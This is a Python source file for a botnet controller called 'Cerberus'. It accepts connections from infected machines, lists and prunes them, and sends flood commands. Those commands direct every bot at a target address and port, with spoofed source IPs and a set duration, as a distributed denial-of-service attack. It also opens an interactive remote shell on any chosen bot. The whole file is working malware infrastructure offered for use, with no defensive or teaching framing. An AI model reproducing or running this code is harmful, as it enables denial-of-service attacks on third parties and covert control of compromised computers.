# Function for listening

import threading
import random
import socket
import time

def botnet_handler(host, port):

    bot_sockets = []

    def listen_for_connections():

        while True:

            bot_s, ip_address = s.accept()

            bot_sockets.append((bot_s, ip_address))

    print()
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    
    s.listen(5)
    
    listening_thread = threading.Thread(target=listen_for_connections)
    listening_thread.start()
    
    while True:
    
        print(" \033[35mCerberus@Botnet\033[39m:\033[36m~\033[39m$ ", end="")
        
        command = input().split(" ")
        
        try:
        
            if command[0].lower() == "help":
                
                print()
                print(" Cerberus v1.3.0 botnet help menu")
                print()
                print(" COMMAND     DOCUMENTATION")
                print(" -------     -------------")
                print()
                print(" HELP        Description: Displays functionality and usage of every command")
                print()
                print()
                print(" BOTS        Description: Lists currently connected bots")
                print()
                print()
                print(" RMU         Description: Removes unresponsive bots from your bot list")
                print()
                print()
                print(" DDOS        Description: Flood an address from all bots")
                print()
                print("             Usage: ddos [-target <target ip>] [-port <port>] [-spoof <spoofed ip>]")
                print("                         [-delay <delay>] [-method <method>] [-threads <threads>]")
                print("                         [-duration <duration>]")
                print()
                print("             Arguments:")
                print()
                print("                 target       ip address of target machine")
                print("                 port         port to send packets through")
                print("                 spoof        ip address to spoof packets from")
                print("                 delay        delay between packets")
                print("                 method       packet method")
                print("                              tcp udp")
                print("                 threads      number of threads")
                print("                 duration     duration of the attack")
                print()
                print()
                print(" SHELL       Description: Lets you access the shell of a specific bot")
                print()
                print("             Usage: shell [ID]")
                print()
                print()
                print(" CLOSE       Description: Close connection to a specific bot")
                print()
                print("             Usage: close [ID]")
                print()
            
            if command[0].lower() == "bots":
                
                print()
                print(f" botnet size: {len(bot_sockets)}")
                print()
                
                for bot_index in range(len(bot_sockets)):
                    
                    print(f" IPV4: {bot_sockets[bot_index][1][0]}{' ' * (20 - len(bot_sockets[bot_index][1][0]))}ID: {bot_index}")
                
                print()
                
            if command[0].lower() == "rmu":
                
                print(" removing unresponsive bots")
                
                unresponsive_bots = []
                
                socket.setdefaulttimeout(1)
                
                for bot_index in range(len(bot_sockets)):
                    
                    ping_back = None
                    
                    try:
                        
                        bot_sockets[bot_index][0].send("rmuaping".encode())
                        ping_back = bot_sockets[bot_index][0].recv(1024).decode()
                        
                    except:
                        
                        pass
                    
                    if ping_back != "rmuaping-back":
                        
                        unresponsive_bots.append(bot_index)
                    
                unresponsive_bots.reverse()
                    
                for bot_index in unresponsive_bots:
                    
                    bot_sockets[bot_index][0].close()
                    bot_sockets.pop(bot_index)
                
                print(f" removed {len(unresponsive_bots)} bots")
                print()
                
                socket.setdefaulttimeout(None)
            
            if command[0].lower() == "ddos":
                
                target = command[command.index("-target") + 1]
                port = int(command[command.index("-port") + 1])
                spoof = command[command.index("-spoof") + 1]
                delay = int(command[command.index("-delay") + 1])
                method = command[command.index("-method") + 1]
                duration = int(command[command.index("-duration") + 1])

                number_of_threads = 0

                if "-threads" in command:
                    number_of_threads = int(command[command.index("-threads") + 1])
                    
                bot_command = command
                bot_command[0] = "flood"
                
                for bot in bot_sockets:
                    
                    bot[0].send(" ".join(command).encode())
                    
                print(f" attacking {target}:{port} from {len(bot_sockets)} bots for {duration} seconds")
                
                time.sleep(duration)
                
                for bot in bot_sockets:
                    
                    bot[0].send("flood-end".encode())
                
                print()
            
            if command[0].lower() == "shell":
                
                print()
                
                client_s = bot_sockets[int(command[1])][0]
                
                client_s.send("cd .".encode())
                current_directory = client_s.recv(2048).decode('utf-8')
                
                output = ""
                
                while output[-11:] != "MESSAGE END":
                            
                            output = output + client_s.recv(2048).decode('utf-8')

                while True:
                    
                    print(f" {current_directory}>", end="")
                    
                    command = input()
                    
                    if command == "exit": break
                    
                    if command != "":
                        
                        client_s.send(command.encode('utf-8'))
                            
                        current_directory =client_s.recv(2048).decode('utf-8')
                            
                        output = ""
                        
                        while output[-11:] != "MESSAGE END":
                            
                            output = output + client_s.recv(2048).decode('utf-8')
                            
                        for line in output[:-12].split("\n"):
                            
                            print(f" {line}")
                    
                        print()
                
                print()
            
            if command[0].lower() == "close":
                
                bot_sockets[int(command[1])][0].close()
                bot_sockets.pop(int(command[1]))

                print()
        
        except:
            
            print("\033[31m an error occurred\033[39m")
            print()